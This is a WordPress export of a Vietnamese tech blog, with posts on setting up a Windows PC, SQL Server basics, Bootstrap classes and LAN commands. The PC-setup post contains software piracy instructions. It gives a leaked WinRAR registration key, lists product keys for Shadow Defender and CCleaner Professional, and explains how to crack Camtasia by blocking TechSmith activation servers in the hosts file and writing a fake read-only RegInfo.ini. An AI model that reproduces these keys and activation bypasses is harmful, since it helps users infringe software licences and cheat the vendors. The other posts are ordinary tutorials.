		<title><![CDATA[Cài một máy tính hoàn chỉnh – P2: Các phần mềm cơ bản]]></title>
		<link>https://duycode.com/2019/08/20/cai-mot-may-tinh-hoan-chinh-p2-cac-phan-mem-co-ban/</link>
		<pubDate>Tue, 20 Aug 2019 21:44:52 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=40</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Văn phòng</h1>
<h2>1. Unikey</h2>
<img src="http://unikey.vn/vietnam/xmedia/images/screenshots/unikey.png" alt="" />
- Unikey: <a href="https://www.unikey.org/download.html" target="_blank" rel="noopener noreferrer">https://www.unikey.org/download.html</a>
<h2>2. Winrar</h2>
- Download: <a href="http://www.rarlab.com/download.htm" target="_blank" rel="noopener noreferrer">http://www.rarlab.com/download.htm</a>
- Key: Copy đoạn code sau lưu thành rarreg.key -&gt; ném trực tiếp vào 1 file nén bất kỳ là có thể reg key
<blockquote>RAR registration data
vietdl.net
Unlimited Company License
UID=27996101676cd47a3408
64122122503408785285aa25406547e8b2de90024a7ef9597f9509
f8b02c2d41b5d476c3c160fce6cb5ffde62890079861be57638717
7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565
b41bcf56929486b8bcdac33d50ecf7739960f8d36f2d4a1b6c1140
7f4c63970973c98d63fcf230483f49411bae352864e73010b9b19b
90f0f547020c9652779e231a7964866eca24577c7ddeab9360b4e9
04efebd231ed54defe7296b7f8e4dc67fcd9cec098ce1236753878</blockquote>
<h2>3. Net Framework 4.5 Full:</h2>
- Tìm link download: <a href="https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers">https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers</a>
<h2>4. Chrome:</h2>
- Download: <a href="https://www.google.com/intl/vi_ALL/chrome/" rel="noopener noreferrer" target="_blank">https://www.google.com/intl/vi_ALL/chrome/</a>
<h2>5. Foxit Reader:</h2>
- Download: <a href="https://www.foxitsoftware.com/products/pdf-reader/" target="_blank" rel="noopener noreferrer">https://www.foxitsoftware.com/products/pdf-reader/</a>

<h1>II. Media</h1>
<h2>1. K-Lite Codec Pack</h2>
- Download: <a href="https://www.codecguide.com/download_kl.htm" target="_blank" rel="noopener noreferrer">https://www.codecguide.com/download_kl.htm</a>
<h2>2. Camtasia</h2>
<h3>2.1. Download:</h3>
http://download.techsmith.com/camtasiastudio/enu/camtasia.exe
https://www.techsmith.com/download-camtasia-studio-thankyou.html
<h3>2.2. Active:</h3>
- Vào: C:\Windows\System32\drivers\etc tìm file host
- Điền thêm vào file host:
<blockquote>127.0.0.1 activation.cloud.techsmith.com
127.0.0.1 oscount.techsmith.com
127.0.0.1 updater.techsmith.com
127.0.0.1 camtasiatudi.techsmith.com
127.0.0.1 tsccloud.cloudapp.net
127.0.0.1 assets.cloud.techsmith.com</blockquote>
- Vào: C:\ProgramData\TechSmith\Camtasia Studio 8 tìm file RegInfo.ini
- Sửa file RegInfo.ini thành như sau:
<blockquote>[RegistrationInfo]
RegisteredTo=Nothing1010
RegistrationKey=E5CUV-SCNDU-54GCC-CDC2T-AMEDM
ValidationData1=1
ValidationData2=1
ValidationData3=1
ValidationData4=1
ValidationData5=1</blockquote>
- Để file RegInfo.ini ở chế độ: Read Only
- Xong...

<h1>III. Bảo mật</h1>
<h2>1. Phần mềm diệt Virus</h2>
<h3>1.1. Avast</h3>
- Homepage: <a href="https://www.avast.com/" target="_blank" rel="noopener noreferrer">https://www.avast.com/</a>
<h2>2. Shadow Defender</h2>
- Download: <a href="http://www.shadowdefender.com/download.html" target="_blank" rel="noopener noreferrer">http://www.shadowdefender.com/download.html</a>
- Key bản Shadow Defender 1.4.0.648:
<blockquote>753QA-XQGM5-U6MMQ-CG0CK-2HTDW
6CS8H-E2VQD-6UANE-97Q0Z-ANB8G
JGMDD-QBR9P-JQPZK-K914G-357ZU
</blockquote>
<h1>IV. Ứng dụng</h1>
<h2>1. SlavaSoft HashCalc</h2>
- Download: <a href="http://www.slavasoft.com/hashcalc/" rel="noopener noreferrer" target="_blank">http://www.slavasoft.com/hashcalc/</a>
<h2>2. CCleaner Professional</h2>
- Download: <a href="https://www.piriform.com/ccleaner/download" target="_blank" rel="noopener noreferrer">https://www.piriform.com/ccleaner/download</a>
- Key v5.21.5700 (nhớ ngắt mạng khi điền key)
<blockquote>C2YW-T25N-8ZMR-EDHM-SZPC
C2YW-HWGQ-KVCA-IMHC-YZPC
C2YW-QQYR-HNBQ-3Y8H-YZPC
</blockquote>
<h2>3. FFSJ</h2>
- Download: <a href="http://www.fastfilejoiner.com/" target="_blank" rel="noopener noreferrer">http://www.fastfilejoiner.com/</a>
<h2>4. CPUID CPU-Z</h2>
- Download: <a href="http://www.cpuid.com/softwares/cpu-z.html" target="_blank" rel="noopener noreferrer">http://www.cpuid.com/softwares/cpu-z.html</a>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>40</wp:post_id>
		<wp:post_date><![CDATA[2019-08-20 21:44:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-20 21:44:52]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-20 21:44:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-20 21:44:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cai-mot-may-tinh-hoan-chinh-p2-cac-phan-mem-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_8b791444c4e059394112926214a9dd2f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_396bdaccaa099e541ea3f6cb7c36ee81]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[SQL Server cơ bản]]></title>
		<link>https://duycode.com/2019/08/21/sql-co-ban/</link>
		<pubDate>Wed, 21 Aug 2019 01:26:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=53</guid>
		<description></description>
		<content:encoded><![CDATA[Ngôn ngữ truy vấn SQL có các thành phần chính: 
- Ngôn ngữ Thao tác Dữ liệu - Data Manipulation Language (DML)
- Ngôn ngữ Định nghĩa Dữ liệu - Data Definition Language (DDL)
- Ngôn ngữ Kiểm soát Dữ liệu - Data Control Language (DCL)
- Data Query Language (DQL)

<img src="https://img1.daumcdn.net/thumb/R800x0/?scode=mtistory2&fname=https%3A%2F%2Ft1.daumcdn.net%2Fcfile%2Ftistory%2F99923F3B5B05D4712E" alt="" />
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>53</wp:post_id>
		<wp:post_date><![CDATA[2019-08-21 01:26:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-21 01:26:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-21 01:26:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-21 01:26:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sql-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[Cài một máy tính hoàn chỉnh – P3: Các phần mềm cho Coder]]></title>
		<link>https://duycode.com/2019/08/27/cai-mot-may-tinh-hoan-chinh-p3-cac-phan-mem-cho-coder/</link>
		<pubDate>Tue, 27 Aug 2019 15:22:03 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=62</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Các trình soạn thảo code</h2>
<h3>1. JAVA</h3>
<h4>1.1. JDK</h4>
- Download: <a href="https://www.oracle.com/java/technologies/javase-downloads.html" rel="noopener noreferrer" target="_blank">https://www.oracle.com/java/technologies/javase-downloads.html</a>
*** Cài đặt JDK: My Computer -> Properties -> Advanced system settings -> Advanced -> Environment Variablles
- Tại System variables -> New: 
 + Variable name: JAVA_HOME
 + Variable value: C:\Program Files\Java\jdk-14.0.1
- Tại System variables -> Variable "Path" -> Edit
 + Sửa thành dòng "%JAVA_HOME%\bin" trước dòng "C:\Windows\system32"

<h4>1.2. Eclipse</h4>
- Download: <a href="https://www.eclipse.org/downloads/packages/" rel="noopener noreferrer" target="_blank">https://www.eclipse.org/downloads/packages/</a>
- Tải phiên bản: Eclipse IDE for Enterprise Java Developers
<h3>3. JetBrain</h3>
- Webstorm: <a href="https://www.jetbrains.com/webstorm/" target="_blank" rel="noopener noreferrer">https://www.jetbrains.com/webstorm/</a>
- DataGrip: <a href="https://www.jetbrains.com/datagrip/" target="_blank" rel="noopener noreferrer">https://www.jetbrains.com/datagrip/</a>
- IntelliJ IDA: <a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener noreferrer">https://www.jetbrains.com/idea/</a>
- Rider: <a href="https://www.jetbrains.com/rider/" target="_blank" rel="noopener noreferrer">https://www.jetbrains.com/rider/</a>
<h3>4.Local Server</h3>
- XAMPP: https://www.apachefriends.org/download.html
<h3>5. Dev-C ++</h3>
- Download: <a href="https://sourceforge.net/projects/orwelldevcpp/" target="_blank" rel="noopener noreferrer">https://sourceforge.net/projects/orwelldevcpp/</a>
<h2>II. Các plugin bắt buộc</h2>
<h3>1. Git</h3>
- Link: https://git-scm.com/downloads
- Github Desktop: https://desktop.github.com/
<h2>III. Các tiện ích khác</h2>
<h3>1. Notepad++</h3>
<img src="https://notepad-plus-plus.org/assets/images/notepad4ever.gif" alt="" />
- Homepage: <a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener noreferrer">https://notepad-plus-plus.org/</a>
<h3>2. Wordpress</h3>
- Download: <a href="https://wordpress.org/download/" target="_blank" rel="noopener noreferrer">https://wordpress.org/download/</a>
<h3>4. Appserv</h3>
- Download: <a href="https://www.appservnetwork.com/en/download/" target="_blank" rel="noopener noreferrer">https://www.appservnetwork.com/en/download/</a>

NodeJS
Heroku
PhotoShop
SQL Server Management Studio

<h2>III. Các tiện ích khác</h2>
<h3>1. StarUML</h3>
<a href="http://staruml.io/">http://staruml.io/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>62</wp:post_id>
		<wp:post_date><![CDATA[2019-08-27 15:22:03]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-27 15:22:03]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-27 15:22:03]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-27 15:22:03]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cai-mot-may-tinh-hoan-chinh-p3-cac-phan-mem-cho-coder]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
		<title><![CDATA[Thủ thuật mạng Lan cơ bản]]></title>
		<link>https://duycode.com/2019/08/27/thu-thuat-mang-lan-co-ban/</link>
		<pubDate>Tue, 27 Aug 2019 09:02:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=66</guid>
		<description></description>
		<content:encoded><![CDATA[Dùng CMD
<img src="https://commandwindows.com/graphics/ipconfig.gif" alt="" />
Ẩn IP:
<pre>net config sever /hidden:yes</pre>
[sourcecode language="plain"]net config sever /hidden:yes[/sourcecode]
Xem IP mình
[sourcecode language="plain"]ipconfig /all[/sourcecode]
<pre>ipconfig /all</pre>
Quét IP trong mạng LAN:
http://www.advanced-ip-scanner.com/]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>66</wp:post_id>
		<wp:post_date><![CDATA[2019-08-27 16:02:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-27 09:02:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-14 14:31:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-14 14:31:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[thu-thuat-mang-lan-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a73ffcfa18ac4248a937453bd3257ad8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Bootstrap cơ bản]]></title>
		<link>https://duycode.com/2019/09/07/bootstrap-co-ban/</link>
		<pubDate>Sat, 07 Sep 2019 21:51:47 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=81</guid>
		<description></description>
		<content:encoded><![CDATA[Homepage:https://getbootstrap.com/
Những vấn đề cần nhớ có trong Bootstrap:
1. Hệ thống lưới: Grid
<h2>2. Text / Typography:</h2>
.h1-h6
.display
.small
.mark
.abbr: cụm từ viết tắt có dấu gạch chân
.blockquote
.font-weight-bold: in đậm
.font-italic: in nghiêng
.font-weight-light: in nhạt
.font-weight-normal: in bình thường
.lead: làm văn bản nổi bật
.small: chữ nhỏ (85% bình thường)
.text-left, .text-center:, .text-right canh trái, canh giữa, canh phải
.text-*-left, .text-*-center, .text-*-right: canh trái, canh giữa, canh phải tùy theo màn hình small, medium, large hay xlarge.
.text-monospace: văn bản khoảng trống đơn
.text-nowrap: văn bản không bao
.text-lowercase, .text-uppercase, .text-capitalize: văn bản thường, văn bản hoa chữ đầu, văn bản in hoa
.text-justify: canh đều
<h2>3. Color:</h2>
.text-muted
.text-primary
.text-success
.text-info
.text-warning
.text-danger
.text-secondary
.text-white
.text-dark
.text-body
.text-light

<h2>4. Table:</h2>
<h2>5. Prosgesbar</h2>

<h2>6. Badge:</h2>
<img src="https://www.tutorialmines.net/wp-content/uploads/2018/02/bootstrap-3-badges-pill.png" alt="" />
<h2>7. Tooltip:</h2>
<h2>8. Popover:</h2>
<h2>9. Badge:</h2>
<h2>10. Alert:</h2>
<h2>11. Button:</h2>
<h2>12. Navigation:</h2>
<h2>13. Dropdown:</h2>
<h2>14. Collapse:</h2>
<h2>15. Carousel: Slider trong Bootstrap</h2>
<h2>16. Filter:</h2>
<h2>17. Scrollspy: Cuộn trang</h2>
<h2>18. Modal: hộp thoại thông báo</h2>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>81</wp:post_id>
		<wp:post_date><![CDATA[2019-09-07 21:51:47]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-09-07 21:51:47]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-09-07 21:51:47]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-09-07 21:51:47]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[bootstrap-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[SQL Server - Ứng dụng vào một Project thực tế]]></title>
		<link>https://duycode.com/2019/10/01/sql-server-ung-dung-vao-mot-project-thuc-te/</link>
		<pubDate>Tue, 01 Oct 2019 23:05:13 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=111</guid>
		<description></description>
		<content:encoded><![CDATA[Công ty CitySoftware cần lập 1 Databse bao gồm 4 bảng để quản lý dữ liệu bao gồm: Employee, GroupWork, GroupDetail, Project.
Trong đó: 1 Employee có thể tham gia nhiều GroupWork, 1 GroupWork có nhiều Employee và 1 Project bao gồm nhiều GroupWork
<img src="https://drive.google.com/uc?export=view&id=1dI_RDc6qvyMSAxtdx0tQLSckzNY9D0c4"/>

<h2>1. Tạo bảng: CREATE TABLE</h2>
<pre>
CREATE TABLE Project(
	ProjectID int IDENTITY(1,1) PRIMARY KEY,
	ProjectName Nvarchar(30),
	StartDate date,
	EndDate date,
	Period int,
	Cost money
);

CREATE TABLE GroupWork(
	GroupID int IDENTITY(1,1) PRIMARY KEY,
	GroupName varchar(30),
	LeaderID int,
	ProjectID int NOT NULL FOREIGN KEY REFERENCES Project(ProjectID)
);

CREATE TABLE Employee(
	EmployeeID int IDENTITY(1,1) PRIMARY KEY,
	Name varchar(100),
	Tel char(10) UNIQUE,
	Email varchar(30),
	Birthday date,
	CONSTRAINT check_birthday CHECK (Birthday < GETDATE())
);

CREATE TABLE GroupDetail(
	GroupID int NOT NULL FOREIGN KEY REFERENCES GroupWork(GroupID),
	EmployeeID int NOT NULL FOREIGN KEY REFERENCES Employee(EmployeeID),
	Statusemployee Nvarchar(100)
);
</pre>

<h2>2. Thêm dữ liệu cho bảng: INSERT TO
<pre>
INSERT INTO Project(ProjectName,StartDate,EndDate,Period,Cost)
	VALUES (N'Xây cầu vượt','2020-01-02','2020-12-15',12,1000);
INSERT INTO Project(ProjectName,StartDate,EndDate,Period,Cost)
	VALUES (N'Xây chung cư','2015-05-10','2018-09-20',20,800);
INSERT INTO Project
	VALUES (N'Chính phủ điện tử','2018-02-15','2022-09-15',7,150150);

INSERT INTO GroupWork(GroupName,LeaderID,ProjectID)
	VALUES ('Nhom ONE',1,1);
INSERT INTO GroupWork
	VALUES ('Nhom VIPPRO',3,2);
INSERT INTO GroupWork
	VALUES ('Nhom Nhanuoc',4,3);

INSERT INTO Employee(Name,Tel,Email)
	VALUES ('Nguyen van A','0123456789','nguyenvana@gmail.com');
INSERT INTO Employee(Name,Tel,Email)
	VALUES ('Tran thi B','0987111222','tranthib@gmail.com');
INSERT INTO Employee(Name,Tel,Email)
	VALUES ('Do Hong C','0123412345','dohongc@gmail.com');
INSERT INTO Employee(Name,Tel,Email)
	VALUES ('Ngo Van D','0986021190','duyhn90a@gmail.com');
INSERT INTO Employee(Name,Tel,Email)
	VALUES ('Bui Thi Tr','0968100994','buitrang@gmail.com');

INSERT INTO GroupDetail(GroupID,EmployeeID,Statusemployee)
	VALUES (1,1,N'đã làm');
INSERT INTO GroupDetail
	VALUES (1,3,N'đang làm');
INSERT INTO GroupDetail
	VALUES (2,2,N'sắp làm');
INSERT INTO GroupDetail
	VALUES (2,4,N'đang làm');
INSERT INTO GroupDetail
	VALUES (2,3,N'đang làm');
INSERT INTO GroupDetail
	VALUES (3,4,N'đang làm');
INSERT INTO GroupDetail
	VALUES (3,5,N'sắp làm');
</pre>

<h2>3. Thao tác định nghĩa dữ liệu - DDL Command</h2>
<pre>
-- 3.a. Sửa cột, thêm cột, xóa cột ( phải xóa constraint trước)
ALTER TABLE EMployee ALTER COLUMN Name Nvarchar(50);
ALTER TABLE Employee ADD IdentityCard int NOT NULL DEFAULT(10000);
ALTER TABLE Employee DROP CONSTRAINT check_birthday;
ALTER TABLE Employee DROP COLUMN Birthday;

-- 3.b. Ngày hoàn thành dự án phải sau ngày bắt đầu dự án
ALTER TABLE Project ADD CHECK (EndDate > StartDate);

-- 3.c. Trường trạng thái làm việc chỉ nhận 1 trong 3 trạng thái: inprogress, pending, done
ALTER TABLE GroupDetail ADD CHECK (GroupDetail.Statusemployee IN (N'đã làm',N'đang làm',N'sắp làm'));

-- 3.d. Điện thoại chỉ được nhập số và bắt đầu bằng số 0, Email có định dạng @.
ALTER TABLE Employee ADD CONSTRAINT check_tel CHECK (Tel LIKE '0%' AND Tel NOT LIKE '%[^0-9]%');
ALTER TABLE Employee ADD CHECK(Email LIKE '%_@_%._%');

-- 3.e. Trưởng nhóm (LeaderID) phải là nhân viên (EmployeeID)
IF OBJECT_ID('dbo.Check_LeaderID') IS NOT NULL
	DROP FUNCTION Check_LeaderID; 
GO
CREATE FUNCTION Check_LeaderID (@ckLeaderID int)
RETURNS int AS
BEGIN
	IF EXISTS (SELECT EmployeeID From Employee WHERE EmployeeID = @ckLeaderID)
        RETURN 1
	RETURN 0
END;
GO
ALTER TABLE GroupWork ADD CONSTRAINT check_constraint_LeaderID CHECK (dbo.Check_LeaderID(LeaderID) = 1);

</pre>

<h2>4. Thao tác dữ liệu - DML Command</h2>
<pre>
-- 4.a. Xóa bảng GroupDetail và xóa Employee 'Ngo Van D'
DELETE FROM GroupDetail;
DELETE FROM Employee WHERE Name LIKE 'Ngo Van D';
-- 4.b. Update EmployeeID = 5 với Name = 'Bui Thi Trang', Email = 'drtrang@gmail.com'
UPDATE Employee
SET Name = 'Bui Thi Trang', Email = 'drtrang@gmail.com'
WHERE EmployeeID = 5;
</pre>

<h2>5. Câu lệnh truy vấn: SELECT</h2>
<pre>
-- 5.a. Xem danh sách tất cả nhân viên
SELECT * FROM Employee
	ORDER BY EmployeeID ASC;
-- 5.b. Liệt kê danh sách nhân viên đang làm dự án "chính phủ điện tử"
SELECT Employee.*,Project.ProjectName FROM Employee
	LEFT JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID 
	LEFT JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID
	LEFT JOIN Project ON GroupWork.ProjectID = Project.ProjectID
	WHERE (ProjectName LIKE N'Chính phủ điện tử');

-- 5.c. Thống kê số nhân viên "đang làm việc" tại mỗi nhóm
SELECT GroupWork.GroupName, COUNT(GroupDetail.EmployeeID) FROM GroupWork
	LEFT JOIN GroupDetail ON GroupWork.GroupID = GroupDetail.GroupID
	WHERE Statusemployee LIKE N'đang làm'
	GROUP BY GroupName;
</pre>

<h2>6. Khung nhìn: VIEW</h2>
<pre>
-- 6.a. Tạo khung nhìn all_information: Liệt kê thông tin về nhân viên, nhóm làm việc có dự án đang thực hiện
CREATE VIEW all_information
AS
SELECT GroupWork.GroupName,Employee.Name,Project.ProjectName,Project.StartDate,Project.EndDate FROM Employee
	FULL JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID
	FULL JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID
	FULL JOIN Project ON GroupWork.ProjectID = Project.ProjectID
	WHERE Project.StartDate < GETDATE() AND Project.EndDate > GETDATE();
GO
SELECT * FROM all_information;

-- 6.b. Sửa khung nhìn all_information 
ALTER VIEW all_information
AS
SELECT Employee.Name,GroupWork.GroupName,Project.ProjectName,Project.StartDate,Project.EndDate FROM Employee
	FULL JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID
	FULL JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID
	FULL JOIN Project ON GroupWork.ProjectID = Project.ProjectID
	WHERE Project.StartDate < GETDATE() AND Project.EndDate > GETDATE();
GO
SELECT * FROM all_information;

-- 6.c. Xóa khung nhìn all_information
DROP VIEW dbo.all_information;
GO
</pre>


<h2>7. Tạo chỉ mục: INDEX</h2>
<pre>
-- a. Tạo chỉ mục duy nhất tên là IX_Group trên 2 trường GroupID và EmployeeID của bảng GroupDetail
DROP INDEX GroupDetail.IX_Group
CREATE UNIQUE INDEX IX_Group ON GroupDetail(GroupID,EmployeeID);

-- b. Tạo chỉ mục tên là IX_Project trên trường ProjectName của bảng Project gồm các trường StartDate và EndDate
DROP INDEX Project.IX_Project
CREATE INDEX IX_Project ON Project(StartDate,EndDate);
</pre>

<h2>8. Tạo các thủ tục lưu trữ: PROCEDURE</h2>
<pre>
-- a. Tăng giá thêm 10% các dự án có giá trị nhỏ hơn 2000
DROP PROCEDURE Project_UpdateCost;
CREATE PROCEDURE Project_UpdateCost 
AS BEGIN
UPDATE Project
	SET Cost = (Cost*1.1)
	WHERE Cost < 2000;
END;
EXEC Project_UpdateCost;

-- b. Hiển thị thông tin về dự án sắp được thực hiện
DROP PROCEDURE Project_near;
CREATE PROCEDURE Project_near
AS BEGIN
SELECT * FROM Project WHERE StartDate > GETDATE()
END;
EXEC Project_near;

-- c. Hiển thị thông tin liên quan về các dự án đã hoàn thành
DROP PROCEDURE Project_done
CREATE PROCEDURE Project_done
AS
SELECT * FROM Project
	LEFT JOIN GroupWork ON Project.ProjectID = GroupWork.ProjectID
	LEFT JOIN GroupDetail ON GroupWork.GroupID = GroupDetail.GroupID
	LEFT JOIN Employee ON GroupDetail.EmployeeID = Employee.EmployeeID
	WHERE EndDate < GETDATE()
GO;
EXEC Project_done;
</pre>
<h2>9. Tạo Trigger</h2>
<pre>
a. Khi trường EndDate được cập nhậtthì tự động tính toán tổng thời gian hoàn thành dự án và cập nhật vào trường Period
b. Đảm bảo rằng khi xóa một Group thì tất cả những bản ghi có liên quan trong bảng GroupDetail cũng sẽ bị xóa theo.
c. Không cho phép chèn 2 nhóm có cùng tên vào trong bảng Group.
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>111</wp:post_id>
		<wp:post_date><![CDATA[2019-10-01 23:05:13]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-10-01 23:05:13]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-10-01 23:05:13]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-10-01 23:05:13]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sql-server-ung-dung-vao-mot-project-thuc-te]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[Thủ thuật máy tính]]></title>
		<link>https://duycode.com/2019/10/08/thu-thuat-may-tinh/</link>
		<pubDate>Tue, 08 Oct 2019 00:14:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=138</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://tmdpc.vn/media/news/83_thu_thuat_meo_vat_su_dung_may_tinh.jpg" alt="" />
<h2>I. Xóa rác, giảm dung lượng ổ C</h2>
C:\Windows\SoftwareDistribution\Download
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>138</wp:post_id>
		<wp:post_date><![CDATA[2019-10-08 00:14:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-10-08 00:14:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-10-08 00:14:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-10-08 00:14:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[thu-thuat-may-tinh]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
		<title><![CDATA[JAVA - JDBC là gì]]></title>
		<link>https://duycode.com/2019/11/09/jdbc-la-gi/</link>
		<pubDate>Sat, 09 Nov 2019 11:37:50 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=141</guid>
		<description></description>
